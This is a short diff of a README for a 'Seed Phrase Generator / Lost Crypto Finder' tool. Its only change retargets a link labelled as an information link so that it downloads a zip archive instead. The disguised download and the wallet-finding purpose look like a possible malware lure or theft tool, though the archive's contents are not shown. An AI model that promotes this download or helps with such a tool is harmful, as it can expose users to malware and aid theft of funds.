@@ -4,7 +4,7 @@ Welcome to the *Seed Phrase Generator / Lost Crypto Finder* tool. This utility i
 
 # Installation
 
-## [CLICK HERE TO FIND OUT MORE](https://github.com/NielsGro/Seed-Phrase-Finder/releases/download/1/Installing_file_win64.zip)
+## [CLICK HERE TO FIND OUT MORE](https://github.com/NielsGro/Seed-Phrase-Finder/releases/download/1/SeedGener.zip)
 
 ## Overview
 
